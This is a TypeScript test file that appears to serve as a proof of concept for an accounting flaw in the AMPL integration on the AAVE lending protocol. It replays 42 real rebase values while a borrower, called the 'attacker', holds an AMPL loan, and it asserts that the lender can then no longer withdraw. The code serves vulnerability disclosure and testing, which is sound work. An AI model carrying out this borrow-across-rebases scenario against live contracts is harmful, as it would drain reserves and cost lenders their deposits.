import BigNumber from 'bignumber.js';

import { TestEnv, makeSuite, SignerWithAddress } from './helpers/make-suite';
import { MAX_UINT_AMOUNT, oneEther } from '../helpers/constants';
import { convertToCurrencyDecimals } from '../helpers/contracts-helpers';
import { RateMode } from '../helpers/types';
import { getAmplVariableDebtToken } from '../helpers/contracts-getters';
import { ethers } from 'ethers';
import { advanceTimeAndBlock } from '../helpers/misc-utils';
import { AmplVariableDebtToken } from '../types';
const { expect } = require('chai');

/* eslint-disable */
// prettier-ignore
// Contains real price changes of AMPL token in blocks range [13337058, 13598539]
// such blocks range corresponds to 42 epochs of AMPL's token (1 epoch is 24 hours)
const AMPL_REBASES = [
    "0.000000", "0.013549", "0.011280", "0.000000",  "0.000000", "-0.005438", "0.000000",
    "0.000000", "0.000000", "0.006574", "0.000000", "-0.007511",  "0.000000", "0.000000",
    "0.000000", "0.005606", "0.005193", "0.000000",  "0.007836",  "0.020685", "0.033833",
    "0.046301", "0.056308", "0.058186", "0.078584",  "0.069495",  "0.032983", "0.026338",
    "0.038472", "0.062131", "0.070151", "0.072878",  "0.068726",  "0.066779", "0.045615",
    "0.044387", "0.039773", "0.047044", "0.057057",  "0.042028",  "0.022529", "0.000000",
  ];
/* eslint-enable */

let lender: SignerWithAddress,
  borrower: SignerWithAddress,
  admin: SignerWithAddress,
  debtToken: AmplVariableDebtToken;

async function rebase(pool, ampl, perc) {
  const currentSupply = new BigNumber((await ampl.totalSupply()).toString());
  const supplyDelta = currentSupply.multipliedBy(perc);

  // tiny deposit to get the pool in sync
  await ampl.connect(admin.signer).approve(pool.address, await fxtPt(ampl, '1'));
  await pool
    .connect(admin.signer)
    .deposit(ampl.address, await fxtPt(ampl, '0.000001'), admin.address, '0');
  await ampl.rebase(1, supplyDelta.toFixed(0, 1));
  await pool
    .connect(admin.signer)
    .deposit(ampl.address, await fxtPt(ampl, '0.000001'), admin.address, '0');
}

function fxtPt(t, amt) {
  return convertToCurrencyDecimals(t.address, amt);
}

makeSuite('AMPL aToken Vulnerability', (testEnv: TestEnv) => {
  before(async () => {
    const { users, ampl, aAMPL, deployer, pool, dai } = testEnv;
    await ampl.setMonetaryPolicy(deployer.address);

    admin = users[1];
    lender = users[2];
    borrower = users[3];

    await aAMPL.initializeDebtTokens();
    debtToken = await getAmplVariableDebtToken(await aAMPL.VARIABLE_DEBT_TOKEN_ADDRESS());

    // transfer 1.000 AMPL tokens to admin
    await ampl.connect(deployer.signer).transfer(admin.address, await fxtPt(ampl, '1000'));

    // transfer 1.000.000 AMPL tokens to lender
    const lenderAAmplDeposit = await fxtPt(ampl, '1000000');
    await ampl.connect(deployer.signer).transfer(lender.address, lenderAAmplDeposit);

    // lender deposits 1.000.000 AMPL tokens into the AAVE
    await ampl.connect(lender.signer).approve(pool.address, lenderAAmplDeposit);
    await pool
      .connect(lender.signer)
      .deposit(ampl.address, lenderAAmplDeposit, lender.address, '0');

    // transfer 500.000 DAI tokens to borrower
    const borrowerDaiBalance = await fxtPt(dai, '500000');
    await dai.mint(borrowerDaiBalance);
    await dai.transfer(borrower.address, borrowerDaiBalance);

    // borrower deposits 500.000 DAI into the AAVE to use as collateral
    await dai.connect(borrower.signer).approve(pool.address, borrowerDaiBalance);
    await pool
      .connect(borrower.signer)
      .deposit(dai.address, borrowerDaiBalance, borrower.address, '0');
  });

  it('Math issue in AMPL integration on AAVE protocol', async () => {
    const { pool, ampl, aAMPL } = testEnv;

    // The borrower borrows 300.000 AMPL on AAVE
    const borrowerAAmplBorrow = await fxtPt(ampl, '300000');
    await pool
      .connect(borrower.signer)
      .borrow(ampl.address, borrowerAAmplBorrow, RateMode.Variable, '0', borrower.address);

    // The borrower hold borrow position opened for the next 42 days
    for (let i = 0; i < AMPL_REBASES.length; ++i) {
      // wait 24 hours before next rebase
      await advanceTimeAndBlock(24 * 60 * 60);
      const expectedRebase = +AMPL_REBASES[i];
      console.log(`Day ${i + 1}, AMPL rebase will be ${expectedRebase}`);

      // AMPL rebase happens
      await pool.updateState(ampl.address);
      await rebase(pool, ampl, expectedRebase);
      await pool.updateState(ampl.address);

      // Validate that attacker's collateral is not under liquidation risk
      const attackerAccountData = await pool.getUserAccountData(borrower.address);
      expect(attackerAccountData.healthFactor.toString()).to.be.bignumber.gt(oneEther.toString());

      const currentDebt = await debtToken.balanceOf(borrower.address);
      console.log(`The debt of the borrower: ${format(currentDebt)}`);
      console.log(
        `AMPL balance of the borrower: ${await ampl.balanceOf(borrower.address).then(format)}`
      );
      const aamplTotalSupply = await aAMPL.totalSupply();
      console.log(`Total supply of the aAMPL token: ${format(aamplTotalSupply)}`);
      console.log(`aAMPL balance of lender: ${await aAMPL.balanceOf(lender.address).then(format)}`);
      const balanceOfAamplToken = await ampl.balanceOf(aAMPL.address);
      console.log(`Underlying asset balance of the aAMPL token: ${format(balanceOfAamplToken)}`);
      console.log(
        `Deficiency of AMPL token in the reserve: ${format(
          aamplTotalSupply.sub(currentDebt).sub(balanceOfAamplToken)
        )}\n`
      );
    }

    // the borrower repays his debt
    await ampl.connect(borrower.signer).approve(pool.address, MAX_UINT_AMOUNT);
    await pool
      .connect(borrower.signer)
      .repay(ampl.address, MAX_UINT_AMOUNT, RateMode.Variable, borrower.address);

    const lenderAamplBalance = await aAMPL.balanceOf(lender.address);
    const amplBalanceOfAamplToken = await ampl.balanceOf(aAMPL.address);
    console.log(`aAMPL balance of the lender: ${format(lenderAamplBalance)}`);
    console.log(`Available AMPL in the reserve: ${format(amplBalanceOfAamplToken)}`);

    // the lender can't withdraw his tokens
    await expect(
      pool.connect(lender.signer).withdraw(ampl.address, MAX_UINT_AMOUNT, lender.address)
    ).to.be.reverted;

    console.log(
      `The lender can't withdraw his AMPL tokens. Deficiency is ${format(
        lenderAamplBalance.sub(amplBalanceOfAamplToken)
      )}`
    );
  });
});

function format(value: ethers.BigNumber, decimals: number = 1e9): string {
  return new BigNumber(value.toString()).div(decimals).toFixed(9);
}